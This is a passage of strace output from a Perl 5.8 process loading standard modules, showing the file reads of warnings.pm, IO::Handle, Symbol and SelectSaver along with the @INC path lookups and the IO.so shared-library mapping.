\'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12646 20:28:53.783214 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12646 20:28:53.784164 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12646 20:28:53.784293 read(8, "", 4096) = 0
12646 20:28:53.784317 close(8)          = 0
12646 20:28:53.784513 _llseek(6, 412, [412], SEEK_SET) = 0
12646 20:28:53.784530 _llseek(6, 0, [412], SEEK_CUR) = 0
12646 20:28:53.784540 close(6)          = 0
12646 20:28:53.784580 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12646 20:28:53.784607 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12646 20:28:53.784635 futex(0xb7f08070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12646 20:28:53.784650 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12646 20:28:53.784664 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n
12646 20:28:53.784751 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12646 20:28:53.784777 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f0c000
12646 20:28:53.784789 mmap2(0xb7f10000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f10000
12646 20:28:53.784804 close(6)          = 0
12646 20:28:53.785005 stat64("/etc/perl/IO/Handle.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.785022 stat64("/etc/perl/IO/Handle.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785036 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.785049 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785062 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.785075 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785089 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.785101 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785114 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.785126 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785139 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.785151 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12646 20:28:53.785172 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12646 20:28:53.785186 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53fc8) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.785198 _llseek(6, 0, [0], SEEK_CUR) = 0
12646 20:28:53.785214 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12646 20:28:53.785606 stat64("/etc/perl/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785623 stat64("/etc/perl/Symbol.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.785636 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785649 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.785666 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785678 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.785692 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785704 stat64("/usr/lib/perl5/Symbol.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.785717 stat64("/usr/share/perl5/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785728 stat64("/usr/share/perl5/Symbol.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.785741 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785754 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.785767 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.785779 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12646 20:28:53.785800 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.785814 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.785825 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.785843 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12646 20:28:53.786287 read(8, "", 4096) = 0
12646 20:28:53.786303 close(8)          = 0
12646 20:28:53.786367 stat64("/etc/perl/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786394 stat64("/etc/perl/SelectSaver.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.786410 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786427 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.786442 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786455 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.786469 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786482 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.786495 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786508 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.786522 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786535 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.786549 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.786562 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12646 20:28:53.786584 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.786600 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.786612 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.786631 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12646 20:28:53.786758 brk(0x81d6000)    = 0x81d6000
